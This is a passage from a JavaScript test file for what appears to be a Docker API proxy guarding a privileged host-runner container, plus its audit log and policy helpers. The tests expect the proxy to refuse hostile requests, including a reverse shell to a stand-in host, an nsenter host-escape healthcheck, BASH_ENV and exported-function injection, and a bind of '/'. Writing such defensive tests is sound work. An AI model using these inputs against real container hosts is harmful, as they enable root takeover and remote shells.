    HostConfig: { Privileged: true, PidMode: 'host', NetworkMode: 'host', AutoRemove: true, CapAdd: null, Binds: null, MemorySwappiness: -1, ConsoleSize: [0, 0], LogConfig: { Type: '', Config: null } },
    ...over,
  })
  it('off (the default): refused, and the message says how to turn it on', async () => {
    const r = await call('POST', '/v1.47/containers/create', hr())
    assert.equal(r.status, 403)
    assert.match(r.json.message, /HOST_RUNNER="on"/)
  })
  it('on: the exact shipped call is allowed (src-info, cf op, deploy)', async () => {
    assert.equal((await call('POST', '/v1.47/containers/create', hr(), portHR)).status, 201)
    assert.equal((await call('POST', '/v1.47/containers/create', hr({}, ['access-list', '/opt/operationkit-src', '/opt/operationkit-src/client.conf']), portHR)).status, 201)
    const deploy = hr({}, ['deploy', '/opt/operationkit-src', '/opt/operationkit-src/client.conf', '9', 'https://ok.example.test/api/health', `${STATE}/data`])
    assert.equal((await call('POST', '/v1.47/containers/create?name=ok-dev-ops-deploy-9', deploy, portHR)).status, 201)
  })
  const bad = [
    ['another script', hr({}, undefined, 'bash -i >& /dev/tcp/evil/1 0>&1')],
    ['another source folder (an attacker-written update.sh)', hr({}, ['deploy', `${STATE}/tmp/evil`, '/opt/operationkit-src/client.conf', '9', 'https://ok.example.test/api/health', `${STATE}/data`])],
    ['an unknown action', hr({}, ['shell', '/opt/operationkit-src', '/opt/operationkit-src/client.conf'])],
    ['a bind of /', hr({ HostConfig: { Privileged: true, PidMode: 'host', Binds: ['/:/host'] } })],
    ['another image', hr({ Image: 'alpine:latest' })],
    ['no host runner label (the preview-spool kick)', hr({ Labels: {} })],
    ['a jail label on a privileged container', hr({ Labels: { 'ok.host-runner': '1', 'ok.objective': '7' } })],
    ['a Healthcheck (runs as host root, review #5)', hr({ Healthcheck: { Test: ['CMD-SHELL', 'nsenter -t 1 -a sh -c id'], Interval: 1000000 } })],
    ['BASH_ENV in Env (review #5)', hr({ Env: ['BASH_ENV=/srv/ok/state/tmp/x'] })],
    ['an exported bash function (review #5)', hr({ Env: ['BASH_FUNC_sudo%%=() { id; }'] })],
    ['a working dir / user / volumes', hr({ WorkingDir: '/tmp', User: '1000', Volumes: { '/x': {} } })],
  ]
  for (const [label, body] of bad) {
    it(`on, but ${label}: refused`, async () => {
      assert.equal((await call('POST', '/v1.47/containers/create', body, portHR)).status, 403)
    })
  }
})

describe('audit trail', () => {
  it('every call is one JSON line with its decision', () => {
    const lines = fs.readFileSync(AUDIT, 'utf8').trim().split('\n').map(l => JSON.parse(l))
    assert.ok(lines.length > 50)
    for (const l of lines) {
      assert.ok(l.ts && l.method && l.path && (l.decision === 'allow' || l.decision === 'deny'), JSON.stringify(l))
    }
    const deny = lines.find(l => l.decision === 'deny' && l.op === 'container.create' && /privileged/.test(l.reason))
    assert.ok(deny, 'a refused privileged create is in the audit log')
    assert.ok(lines.some(l => l.decision === 'allow' && l.op === 'container.create' && l.target?.objective === '7'))
    assert.ok(lines.some(l => l.decision === 'deny' && l.op === 'container.remove' && l.target?.container === 'command-center'))
  })
})

describe('pure policy helpers', () => {
  it('checkKeys refuses non-ASCII and case-duplicate keys', () => {
    assert.equal(policy.checkKeys({ a: { B: 1, c: [{ d: 1 }] } }), null)
    assert.match(policy.checkKeys({ a: { B: 1, b: 2 } }), /appears twice/)
    assert.match(policy.checkKeys({ 'Key': 1 }), /not plain ASCII/)
  })
  it('loadConfig rejects a relative bind root', () => {
    assert.throws(() => policy.loadConfig({ DOCKER_PROXY_BIND_ROOTS: 'state' }))
  })
})
